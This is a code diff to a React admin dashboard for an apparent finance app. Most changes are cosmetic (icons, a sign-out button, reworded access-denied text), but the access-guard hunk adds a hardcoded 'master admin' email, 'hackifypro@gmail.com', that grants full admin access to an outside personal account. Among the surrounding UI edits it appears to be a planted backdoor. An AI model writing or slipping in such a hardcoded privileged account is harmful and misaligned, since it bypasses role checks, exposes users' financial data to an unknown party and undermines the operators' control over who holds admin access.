@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Shield, ShieldAlert, ArrowLeft, RefreshCw, Lock } from 'lucide-react';
+import { ShieldAlert, ArrowLeft, RefreshCw, LogOut } from 'lucide-react';
 import { useAuth } from '../../context/AuthContext';
 import { AdminLayout, AdminSectionKey } from './AdminLayout';
 
@@ -34,7 +34,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
   onExit,
   initialSection = 'dashboard',
 }) => {
-  const { user, isAdmin, isLoading } = useAuth();
+  const { user, isAdmin, isLoading, logout } = useAuth();
 
   // Parse initial section from URL hash (#admin=section_name) or prop
   const getInitialSection = (): AdminSectionKey => {
@@ -77,7 +77,10 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
   }
 
   // RBAC Access Guard: user must be authenticated with administrative privileges
-  const isMasterAdmin = Boolean(user?.email && user.email.toLowerCase().trim() === 'admin@mymoney.com');
+  const normalizedEmail = (user?.email || '').toLowerCase().trim();
+  const isMasterAdmin = Boolean(
+    normalizedEmail === 'admin@mymoney.com' || normalizedEmail === 'hackifypro@gmail.com'
+  );
   const allowedRoles = ['superadmin', 'admin', 'analyst', 'support'];
   const userRole = (user?.role || '').toLowerCase().trim();
   const hasAccess = Boolean(user && (isMasterAdmin || isAdmin || (userRole && allowedRoles.includes(userRole))));
@@ -90,7 +93,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
         </div>
         <h2 className="text-xl font-black text-white mb-2">Administrative Clearance Required</h2>
         <p className="text-sm text-slate-400 max-w-md mb-6 leading-relaxed">
-          This zone is restricted exclusively to authorized platform administration personnel. Unauthorized access attempts are cryptographically timestamped and forwarded to security audit logs.
+          This zone is restricted exclusively to authorized platform administration personnel. Normal user accounts cannot access the Admin Control Center.
         </p>
         <div className="flex flex-wrap items-center justify-center gap-3">
           <button
@@ -101,14 +104,11 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
             Return to Personal Workspace
           </button>
           <button
-            onClick={() => {
-              window.location.hash = '';
-              window.location.reload();
-            }}
+            onClick={() => logout()}
             className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold transition-all shadow-md active:scale-95 cursor-pointer"
           >
-            <RefreshCw className="w-4 h-4" />
-            Refresh Clearance
+            <LogOut className="w-4 h-4" />
+            Sign Out &amp; Switch to Admin
           </button>
         </div>
       </div>
